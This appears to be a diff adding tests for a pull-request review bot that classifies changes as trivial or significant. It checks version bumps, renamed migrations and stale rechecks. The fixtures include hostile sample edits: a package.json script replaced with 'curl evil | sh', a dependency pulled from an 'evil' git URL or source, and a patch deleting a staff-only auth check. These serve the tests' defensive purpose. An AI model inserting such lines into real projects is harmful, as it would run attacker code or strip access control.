@@ -109,6 +109,51 @@ describe("trivial-delta classifier", () => {
     expect(d.files.map((f) => f.reason)).toEqual(["version-bump", "version-bump"]);
   });
 
+  // Selfscan 8c54fd9f: "every changed line mentions version" let dependency
+  // and script edits that merely carry the word pass as a release bump.
+  it("calls a manifest edit that only MENTIONS version significant", () => {
+    const cases: Array<[string, string]> = [
+      ["Cargo.toml", '@@\n+evil = { version = "1", git = "https://example.com/evil" }'],
+      [
+        "Cargo.toml",
+        '@@\n-serde = { version = "1", features = ["derive"] }\n+serde = { version = "1", features = ["derive", "rc"] }',
+      ],
+      ["pyproject.toml", '@@\n-requests = { version = "^2.0" }\n+requests = { version = "^2.0", source = "evil" }'],
+      ["package.json", '@@\n-    "version": "npm run build",\n+    "version": "curl evil | sh",'],
+    ];
+    for (const [filename, patch] of cases) {
+      const d = classifyDelta([file({ filename, patch })]);
+      expect(d.class, `${filename}: ${patch}`).toBe("significant");
+    }
+  });
+
+  it("still calls a bare release-version bump trivial in every manifest", () => {
+    const cases: Array<[string, string]> = [
+      ["package.json", '@@\n-  "version": "1.2.3",\n+  "version": "1.2.4",'],
+      ["pyproject.toml", '@@\n-version = "0.4.1"\n+version = "0.4.2"'],
+      ["Cargo.toml", "@@\n-version = '0.4.1'\n+version = '0.5.0'"],
+    ];
+    for (const [filename, patch] of cases) {
+      const d = classifyDelta([file({ filename, patch })]);
+      expect(d.files[0]?.reason, `${filename}: ${patch}`).toBe("version-bump");
+    }
+  });
+
+  // Selfscan e0d7c6a8: a renamed migration WITH churn but no patch (GitHub
+  // omits it on large files) proved nothing, yet classified as a renumber.
+  it("keeps a renamed migration with churn and no patch significant", () => {
+    const d = classifyDelta([
+      file({
+        filename: "app/migrations/0043_add_col.py",
+        previous_filename: "app/migrations/0042_add_col.py",
+        status: "renamed",
+        additions: 40,
+        deletions: 3,
+      }),
+    ]);
+    expect(d.class).toBe("significant");
+  });
+
   it("calls a package.json dependency edit significant", () => {
     const d = classifyDelta([
       file({
@@ -347,8 +392,12 @@ class FakeAdapter implements RecheckAdapter {
     this.calls.push(`listPrFiles:${n}`);
     return this.own;
   }
+  /** What the PR owned at the reviewed head (`compare <base_ref>...<reviewed>`);
+   * undefined ⇒ the same as it owns now. */
+  ownedAtReview: DeltaFile[] | undefined;
   async compareFiles(base: string, head: string): Promise<DeltaFile[]> {
     this.calls.push(`compare:${base.slice(0, 4)}..${head.slice(0, 4)}`);
+    if (base === this.base_ref) return this.ownedAtReview ?? this.own;
     return this.delta;
   }
 }
@@ -547,6 +596,51 @@ describe("runRecheck", () => {
     h.store.recordApprovalWithheld(PR, { head_sha: OLD, ci_state: "red", reason: "red-ci" });
     await runRecheck(h.deps, { pr: PR, trigger: "push", head_sha: HEAD });
     expect(h.store.approvalWithheld(PR)?.head_sha).toBe(OLD);
+  });
+
+  // Selfscan 8dd186e2: ownership read only at the CURRENT head labelled a
+  // post-approval REVERSION of a reviewed file base-merge — the file left the
+  // PR's diff exactly because the push undid it.
+  it("a push reverting a reviewed file to its base content is significant, not base-merge", async () => {
+    const h = harness();
+    h.adapter.ownedAtReview = [file({ filename: "app/auth.py" }), file({ filename: "app/api.py" })];
+    h.adapter.own = [file({ filename: "app/api.py" })];
+    h.adapter.delta = [
+      file({
+        filename: "app/auth.py",
+        patch: "@@\n-    if not user.is_staff:\n-        raise Forbidden()\n+    pass",
+      }),
+    ];
+    const out = await runRecheck(h.deps, { pr: PR, trigger: "push", head_sha: HEAD });
+    expect(out).toMatchObject({ action: "recheck" });
+    expect(h.injected).toHaveLength(1);
+  });
+
+  it("a file the PR never owned at either head stays a trivial base-merge", async () => {
+    const h = harness();
+    h.adapter.ownedAtReview = [file({ filename: "src/app.ts" })];
+    h.adapter.own = [file({ filename: "src/app.ts" })];
+    h.adapter.delta = [file({ filename: "src/base_only.py", additions: 5, deletions: 5 })];
+    const out = await runRecheck(h.deps, { pr: PR, trigger: "push", head_sha: HEAD });
+    expect(out).toMatchObject({ action: "noop", reason: "trivial-delta" });
+  });
+
+  // Selfscan 3ed511f1: two overlapping trivial rechecks — the older one
+  // finishing last carried the withheld mark BACK to the older head.
+  it("a stale trivial recheck never carries the withheld mark off the PR's current head", async () => {
+    const H3 = "3333333333333333333333333333333333333333";
+    const h = harness();
+    h.store.recordApprovalWithheld(PR, { head_sha: OLD, ci_state: "red", reason: "red-ci" });
+    h.adapter.delta = [file({ filename: "yarn.lock", additions: 2, deletions: 2 })];
+    h.adapter.own = [file({ filename: "yarn.lock" })];
+    // The newer push already landed and was handled: the PR is at H3 and the
+    // mark was carried there.
+    h.store.upsertPr({ ...h.store.getPr(PR)!, head_sha: H3 });
+    await runRecheck(h.deps, { pr: PR, trigger: "push", head_sha: H3 });
+    expect(h.store.approvalWithheld(PR)?.head_sha).toBe(H3);
+    // The older push's handler finishes late.
+    await runRecheck(h.deps, { pr: PR, trigger: "push", head_sha: HEAD });
+    expect(h.store.approvalWithheld(PR)?.head_sha).toBe(H3);
   });
 
   it("spends no API call at all on an unchanged head", async () => {
